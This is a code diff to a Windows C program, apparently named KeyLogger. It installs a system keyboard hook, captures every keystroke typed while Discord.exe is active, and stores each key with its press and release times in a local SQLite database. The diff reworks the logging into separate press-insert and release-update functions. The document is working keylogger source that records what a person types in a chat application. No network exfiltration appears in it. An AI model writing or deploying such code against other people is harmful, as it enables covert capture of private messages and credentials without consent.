@@ -10,7 +10,7 @@
 #endif
 
 // Database path - adjust this to match your project structure
-#define DB_PATH "../../KeyLogger/data/Database.db"
+#define DB_PATH "C:/Users/Ben/CLionProjects/SaveInput/KeyLogger/data/database.db"
 
 // SQLite database connection
 sqlite3 *db = NULL;
@@ -19,7 +19,8 @@ sqlite3 *db = NULL;
 int init_database();
 int log_key_press(const char *key, double press_time, double release_time);
 void cleanup_database();
-
+int insert_key_press(const char *key, double press_time);
+int update_key_release(const char *key, double release_time);
 #ifdef _WIN32
 // Windows-specific keyboard hook
 HHOOK keyboard_hook;
@@ -34,59 +35,52 @@ LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         char* window_name = get_active_window_name();
         if (window_name && strcmp(window_name, "Discord.exe") == 0) {
-            static double press_times[256] = {0};  // Store press times for each key
+            char key_name[32] = {0};
 
-            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-                // Key press event
-                press_times[vkCode] = get_high_precision_time();
-            }
-            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-                // Key release event
-                double release_time = get_high_precision_time();
-                double press_time = press_times[vkCode];
+            // Resolve key name only once
+            BYTE keyboard_state[256] = {0};
+            GetKeyboardState(keyboard_state);
+            WORD character = 0;
 
-                if (press_time > 0) {
-                    // Get the key name or character
-                    char key_name[32] = {0};
-
-                    // Try to get printable character
-                    BYTE keyboard_state[256] = {0};
-                    GetKeyboardState(keyboard_state);
-
-                    // Convert virtual key to ASCII
-                    WORD character = 0;
-                    if (ToAscii(vkCode, kbStruct->scanCode, keyboard_state, &character, 0) == 1) {
-                        sprintf(key_name, "%c", (char)character);
-                    } else {
-                        // For special keys, use their virtual key codes
-                        switch (vkCode) {
-                            case VK_RETURN: strcpy(key_name, "Key.enter"); break;
-                            case VK_SPACE: strcpy(key_name, "Key.space"); break;
-                            case VK_BACK: strcpy(key_name, "Key.backspace"); break;
-                            case VK_TAB: strcpy(key_name, "Key.tab"); break;
-                            case VK_SHIFT:
-                            case VK_LSHIFT:
-                            case VK_RSHIFT: strcpy(key_name, "Key.shift"); break;
-                            case VK_CONTROL:
-                            case VK_LCONTROL: strcpy(key_name, "Key.ctrl_l"); break;
-                            case VK_MENU:
-                            case VK_LMENU: strcpy(key_name, "Key.alt_l"); break;
-                            case VK_ESCAPE: strcpy(key_name, "Key.esc"); break;
-                            default: sprintf(key_name, "Key.%d", vkCode);
-                        }
-                    }
-
-                    // Log key press to database
-                    log_key_press(key_name, press_time, release_time);
-                    press_times[vkCode] = 0;  // Reset press time
+            if (ToAscii(vkCode, kbStruct->scanCode, keyboard_state, &character, 0) == 1) {
+                sprintf(key_name, "%c", (char)character);
+            } else {
+                switch (vkCode) {
+                    case VK_RETURN: strcpy(key_name, "Key.enter"); break;
+                    case VK_SPACE: strcpy(key_name, "Key.space"); break;
+                    case VK_BACK: strcpy(key_name, "Key.backspace"); break;
+                    case VK_TAB: strcpy(key_name, "Key.tab"); break;
+                    case VK_SHIFT:
+                    case VK_LSHIFT:
+                    case VK_RSHIFT: strcpy(key_name, "Key.shift"); break;
+                    case VK_CONTROL:
+                    case VK_LCONTROL: strcpy(key_name, "Key.ctrl_l"); break;
+                    case VK_MENU:
+                    case VK_LMENU: strcpy(key_name, "Key.alt_l"); break;
+                    case VK_ESCAPE: strcpy(key_name, "Key.esc"); break;
+                    default: sprintf(key_name, "Key.%d", vkCode);
                 }
             }
+
+            // Handle key press
+            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+                double press_time = get_high_precision_time();
+                insert_key_press(key_name, press_time);
+            }
+
+            // Handle key release
+            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+                double release_time = get_high_precision_time();
+                update_key_release(key_name, release_time);
+            }
         }
+
         free(window_name);
     }
 
     return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
 }
+
 
 // Get active window executable name
 char* get_active_window_name() {
@@ -167,38 +161,64 @@ int init_database() {
 }
 
 // Log a key press to the database
-int log_key_press(const char *key, double press_time, double release_time) {
+int insert_key_press(const char *key, double press_time) {
     if (!db) return -1;
 
-    // Prepare the SQL statement
     sqlite3_stmt *stmt;
-    const char *sql = "INSERT INTO messages (press_time, release_time, message) VALUES (?, ?, ?)";
+    const char *sql = "INSERT INTO messages (press_time, release_time, message) VALUES (?, NULL, ?)";
 
     int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
     if (rc != SQLITE_OK) {
-        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
+        fprintf(stderr, "Insert prepare failed: %s\n", sqlite3_errmsg(db));
         return -1;
     }
 
-    // Bind values to the statement
     sqlite3_bind_double(stmt, 1, press_time);
-    sqlite3_bind_double(stmt, 2, release_time);
-    sqlite3_bind_text(stmt, 3, key, -1, SQLITE_STATIC);
+    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);
 
-    // Execute the statement
     rc = sqlite3_step(stmt);
     if (rc != SQLITE_DONE) {
-        fprintf(stderr, "Failed to insert data: %s\n", sqlite3_errmsg(db));
+        fprintf(stderr, "Insert failed: %s\n", sqlite3_errmsg(db));
         sqlite3_finalize(stmt);
         return -1;
     }
 
-    // Finalize the statement
     sqlite3_finalize(stmt);
-    printf("Logged key: %s (held for %.3fs)\n", key, release_time - press_time);
+    printf("Inserted key press: %s at %.3fs\n", key, press_time);
     return 0;
 }
+int update_key_release(const char *key, double release_time) {
+    if (!db) return -1;
 
+    sqlite3_stmt *stmt;
+
+    // Correct SQL with subquery to get the most recent matching row
+    const char *sql = "UPDATE messages SET release_time = ? "
+                      "WHERE rowid = ("
+                      "  SELECT rowid FROM messages "
+                      "  WHERE message = ? AND release_time IS NULL "
+                      "  ORDER BY press_time DESC LIMIT 1"
+                      ")";
+    printf("Inserted key release: %s at %.3fs\n", key, release_time);
+    int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Update prepare failed: %s\n", sqlite3_errmsg(db));
+        return -1;
+    }
+
+    sqlite3_bind_double(stmt, 1, release_time);  // Bind release_time
+    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);  // Bind key
+
+    rc = sqlite3_step(stmt);
+    if (rc != SQLITE_DONE) {
+        fprintf(stderr, "Failed to update data: %s\n", sqlite3_errmsg(db));
+        sqlite3_finalize(stmt);
+        return -1;
+    }
+
+    sqlite3_finalize(stmt);
+    return 0;
+}
 // Clean up database connection
 void cleanup_database() {
     if (db) {
